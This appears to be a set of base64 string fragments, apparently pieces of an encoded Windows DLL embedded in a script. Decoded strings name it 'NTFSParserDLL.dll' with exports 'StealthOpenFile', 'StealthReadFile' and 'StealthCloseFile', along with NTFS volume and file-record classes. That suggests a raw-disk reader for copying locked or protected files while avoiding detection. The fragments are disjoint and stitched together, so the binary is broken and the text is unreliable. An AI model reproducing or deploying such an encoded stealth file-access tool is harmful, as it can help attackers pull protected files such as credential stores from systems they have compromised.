AAAAAAAAAAAExqAAB9agAA8HUAALC8AADw2gAAUOYAAHDmAACu5gAA/uYAADjnAABo5wAAo+cAANPnAAAD6AAAKOgAAH/oAAC46AAA6OgAACbpAAC+6QAA6+kAACPqAABL6gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeE8AEAAAAAAwUQEQAgAAADxRARBYUQEQAAAAAABwARAAAAAA/////wAAAAAMAAAADE8AEAAAAAAccAEQAAAAAP////8AAAAADAAAAG9uABAAAAAAOHABEAAAAAD/////AAAAAAwAAABCTwAQAAAAAINPABAAAAAAoFEBEAMAAACwUQEQdFEBEFhRARAAAAAAWHABEAAAAAD/////AAAAAAwAAAAnTwAQAAAAAINPABAAAAAA3FEBEAMAAADsUQEQdFEBEFhRARAAAAAAeHABEAAAAAD/////AAAAAAwAAABdTwAQ/v///wAAAADU////AAAAAP7///8AAAAAKlcAEAAAAAD+////AAAAAND///8AAAAA/v///wAAAAC+XAAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAC1dABAAAAAA/v///wAAAADM////AAAAAP7///9sXQAQlV0AEAAAAAD+////AAAAANj///8AAAAA/v///wAAAADsYAAQAAAAAP7///8AAAAA1P///wAAAAD+////hGIAEJ5iABAAAAAA/v///wAAAADE////AAAAAP7///8AAAAAX3QAEAAAAAD+////AAAAANT///8AAAAA/v///wAAAABEewAQAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAAd/ABAAAAAA/v///wAAAADU//','kluaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQAwAFHZXRDdXJyZW50UHJvY2VzcwDABFRlcm1pbmF0ZVByb2Nlc3MAAMUEVGxzQWxsb2MAAMcEVGxzR2V0VmFsdWUAyARUbHNTZXRWYWx1ZQDGBFRsc0ZyZWUAYwJHZXRTdGFydHVwSW5mb1cAGAJHZXRNb2R1bGVIYW5kbGVXAABKAkdldFByb2Nlc3NIZWFwAADzAUdldEZpbGVUeXBlANEARGVsZXRlQ3JpdGljYWxTZWN0aW9uABMCR2V0TW9kdWxlRmlsZU5hbWVBAACnA1F1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyAMEBR2V0Q3VycmVudFByb2Nlc3NJZAB5AkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lANoBR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAAYQFGcmVlRW52aXJvbm1lbnRTdHJpbmdzVwDuAEVudGVyQ3JpdGljYWxTZWN0aW9uAAA5A0xlYXZlQ3JpdGljYWxTZWN0aW9uAAA+A0xvYWRMaWJyYXJ5RXhXAADSAkhlYXBSZUFsbG9jAIoDT3V0cHV0RGVidWdTdHJpbmdXAAA/A0xvYWRMaWJyYXJ5VwAALQNMQ01hcFN0cmluZ1cAAJoBR2V0Q29uc29sZUNQAACsAUdldENvbnNvbGVNb2RlAABnBFNldEZpbGVQb2ludGVyRXgAAIcEU2V0U3RkSGFuZGxlAAAkBVdyaXRlQ29uc29sZVcAVwFGbHVzaEZpbGVCdWZmZXJzAACPAENyZWF0ZUZpbGVXAAAAAAAAAAAA0BUUUgAAAAAmYQEAAQAAAAMAAAADAAAACGEBABRhAQAgYQEAQEIAAIA+AACAQQAAOGEBAElhAQBZYQEAAAABAAIATlRGU1BhcnNlckRMTC5kbGwAU3RlYWx0aENsb3NlRmlsZQBTdGVhbHRoT3BlbkZpbGUAU3RlYWx0aFJlYWRGaWxlAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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','A+2+Y','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jYaN0o3eje1N+U3FTg6OFw4njjKOPo4ETk4OdA5/Tk1Omo6gTqROqE6sjq2OsI6xjrSOtY6AAAA8AAArAEAABQxGDEcMSgxLDEwMTQxQDFEMUgxnDGkMawxtDG8McQxzDHUMdwx5DHsMfQx/DEEMgwyFDIcMiQyLDI0MjwyRDJMMlQyXDJkMmwydDJ8MoQyjDKUMpwypDKsMrQyvDLEMswy1DLcMuQy7DL0MvwyBDMMMxQzHDMkMywzNDM8M0QzTDNUM1wzZDNsM3QzfDOEM4wzlDOcM6QzrDO0M7wzxDPMM9Qz3DPkM/Qz/DMENAw0FDQcNCQ0LDQ0NDw0RDRMNFQ0XDRkNGw0dDR8NIQ0jDSUNJw0pDSsNLQ0vDTENMw01DTcNOQ07DT0NPw0BDUMNRQ1HDUkNSw1NDU8NUQ1TDVUNVw1ZDVsNXQ1fDWENYw1lDWcNaQ1rDW0Nbw1xDXMNdQ13DXkNew19DX8NQQ2DDYUNhw2JDYsNjQ2PDZENkw2VDZcNvA+9D74Pvw+AD8EPwg/DD8QPxQ/GD8cPyA/JD8oPyw/MD80Pzg/PD9AP0Q/SD9MP1A/VD9YP1w/YD9kP2g/fD+AP4Q/iD+MP5A/lD+YP5w/oD+kP6g/rD/UP9g/3D8AAAAAAQBAAAAArDi0OLw4xDjMONQ43DjkOOw49Dj8OAQ5DDkUORw5JDksOTQ5PDlEOUw5VDlcOXw6gDqEOog6AAAAEAEAXAMAADgyPDJAMkQy3DLkMuwy9DL8MgQzDDMU','AAAAAA/AD+P8klVRVABCL/2RVABBsVQAQfFUAEJBVABCLRCQMXl/DkIpGA4hHA4tEJAxeX8ONSQCKRgOIRwOKRgKIRwKLRCQMXl/DkIpGA4hHA4pGAohHAopGAYhHAYtEJAxeX8ONpCQAAAAAV4vGg+APhcAPhdIAAACL0YPhf8HqB3RljaQkAAAAAJBmD28GZg9vThBmD29WIGYPb14wZg9/B2YPf08QZg9/VyBmD39fMGYPb2ZAZg9vblBmD292YGYPb35wZg9/Z0BmD39vUGYPf3dgZg9/f3CNtoAAAACNv4AAAABKdaOFyXRPi9HB6gSF0nQXjZsAAAAAZg9vBmYPfweNdhCNfxBKde+D4Q90KovBwekCdA2LFokXjXYEjX8ESXXzi8iD4QN0D4oGiAdGR0l19','BEBAIAAD4JgEQEwgAAAQnARAUCAAAECcBEBYIAAAcJwEQGggAACgnARAdCAAAQCcBECwIAABMJwEQOwgAAGQnARA+CAAAcCcBEEMIAAB8JwEQawgAAJQnARABDAAApCcBEAQMAACwJwEQBwwAALwnARAJDAAAyCcBEAoMAADUJwEQDAwAAOAnARAaDAAA7CcBEDsMAAAEKAEQawwAABAoARABEAAAICgBEAQQAAAsKAEQBxAAADgoARAJEAAARCgBEAoQAABQKAEQDBAAAFwoARAaEAAAaCgBEDsQAAB0KAEQARQAAIQoARAEFAAAkCgBEAcUAACcKAEQCRQAAKgoARAKFAAAtCgBEAwUAADAKAEQGhQAAMwoARA7FAAA5CgBEAEYAAD0KAEQCRgAAAApARAKGAAADCkBEAwYAAAYKQEQGhgAACQpARA7GAAAPCkBEAEcAAB','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